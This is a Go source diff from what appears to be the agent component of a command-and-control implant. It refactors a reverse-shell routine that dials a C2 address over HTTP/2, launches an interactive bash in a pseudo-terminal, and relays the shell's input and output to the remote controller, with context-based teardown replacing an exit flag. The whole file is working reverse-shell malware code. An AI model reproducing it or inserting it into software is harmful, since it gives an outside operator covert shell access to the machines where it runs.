@@ -1,11 +1,11 @@
 package agent
 
 import (
+	"context"
 	"log"
 	"os"
 	"os/exec"
 	"os/signal"
-	"strings"
 	"syscall"
 
 	"github.com/creack/pty"
@@ -19,17 +19,19 @@ func ActivateShell() {
 		err       error
 		streamURL = CCAddress + tun.StreamAPI
 
-		conn        *h2conn.Conn // reverse shell uses this connection
-		isShellExit = false      // when to exit
-		shellPID    = 0          // PID of the bash shell
+		conn     *h2conn.Conn // reverse shell uses this connection
+		ctx      context.Context
+		cancel   context.CancelFunc
+		shellPID = 0 // PID of the bash shell
 	)
 
 	// connect CC
-	conn, _, _, err = ConnectCC(streamURL)
+	conn, ctx, cancel, err = ConnectCC(streamURL)
 	log.Print("reverseBash started")
 
 	// clean up connection and bash
 	cleanup := func() {
+		cancel()
 		proc, err := os.FindProcess(shellPID)
 		if err != nil {
 			log.Print("bash shell already gone: ", err)
@@ -46,49 +48,53 @@ func ActivateShell() {
 	}
 	defer cleanup()
 
-	go reverseShell(SendCC, RecvCC, &isShellExit, &shellPID)
+	go reverseShell(ctx, cancel, SendCC, RecvCC, &shellPID)
 
 	go func() {
 		for {
-			// might not work, but it exits when its parent exits
-			if isShellExit {
+			select {
+			case <-ctx.Done():
 				return
+			default:
+				// if connection does not exist yet
+				if conn == nil {
+					continue
+				}
+				data := make([]byte, BufSize)
+				_, err = conn.Read(data)
+				if err != nil {
+					log.Print("Read remote: ", err)
+					cancel()
+					return
+				}
+				RecvCC <- data
 			}
-
-			// if connection does not exist yet
-			if conn == nil {
-				continue
-			}
-			data := make([]byte, BufSize)
-			_, err = conn.Read(data)
-			if err != nil {
-				log.Print("Read remote: ", err)
-				cleanup()
-				isShellExit = true
-				return
-			}
-			RecvCC <- data
 		}
 	}()
 
 	for outgoing := range SendCC {
-		if isShellExit {
+		select {
+		case <-ctx.Done():
 			return
-		}
-		// if connection does not exist yet
-		if conn == nil {
-			continue
-		}
-		_, err = conn.Write(outgoing)
-		if err != nil {
-			log.Print("Send to remote: ", err)
-			isShellExit = true
+		default:
+			// if connection does not exist yet
+			if conn == nil {
+				continue
+			}
+			_, err = conn.Write(outgoing)
+			if err != nil {
+				log.Print("Send to remote: ", err)
+				return
+			}
 		}
 	}
 }
 
 // reverseShell - Execute a reverse shell to host
-func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool, pid *int) {
+func reverseShell(ctx context.Context, cancel context.CancelFunc,
+	send chan<- []byte, recv <-chan []byte, pid *int) {
+
+	// shell command
 	cmd := exec.Command("bash", "-li")
 
 	initWinSize := pty.Winsize{Rows: 23, Cols: 80}
@@ -103,52 +109,60 @@ func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool, pid *i
 	ch := make(chan os.Signal, 1)
 	signal.Notify(ch, syscall.SIGWINCH)
 	go func() {
+		defer func() { cancel() }()
 		for range ch {
-			if err := pty.InheritSize(os.Stdin, shellf); err != nil {
-				log.Printf("error resizing pty: %s", err)
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				if err := pty.InheritSize(os.Stdin, shellf); err != nil {
+					log.Printf("error resizing pty: %s", err)
+				}
 			}
 		}
 	}()
 	ch <- syscall.SIGWINCH // Initial resize.
 
 	defer func() {
+		cancel()
 		err = shellf.Close()
 		if err != nil {
 			log.Print("Closing shellf: ", err)
 		}
-		*finished = true
 		log.Print("reverseShell exited")
 	}()
 
 	// write CC's input to bash's PTY stdin
 	go func() {
+		defer func() { cancel() }()
 		for incoming := range recv {
-			if strings.HasPrefix(string(incoming), "exit\n") {
-				log.Print("Exiting due to 'exit' command")
-				_, err = shellf.WriteString("exit\n")
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				_, err := shellf.Write(incoming)
 				if err != nil {
-					log.Print("failed to exit bash shell: ", err)
+					log.Print("shell write stdin: ", err)
+					return
 				}
-				log.Print("bash shell exited")
-				return
-			}
-			_, err := shellf.Write(incoming)
-			if err != nil {
-				log.Print("shell write stdin: ", err)
-				return
 			}
 		}
 	}()
 
 	// read from bash's PTY output
 	for {
-		buf := make([]byte, BufSize)
-		_, err = shellf.Read(buf)
-		// fmt.Printf("%s", buf) // echo CC's console
-		send <- buf
-		if err != nil {
-			log.Print("shell read: ", err)
+		select {
+		case <-ctx.Done():
 			return
+		default:
+			buf := make([]byte, BufSize)
+			_, err = shellf.Read(buf)
+			// fmt.Printf("%s", buf) // echo CC's console
+			send <- buf
+			if err != nil {
+				log.Print("shell read: ", err)
+				return
+			}
 		}
 	}
 }
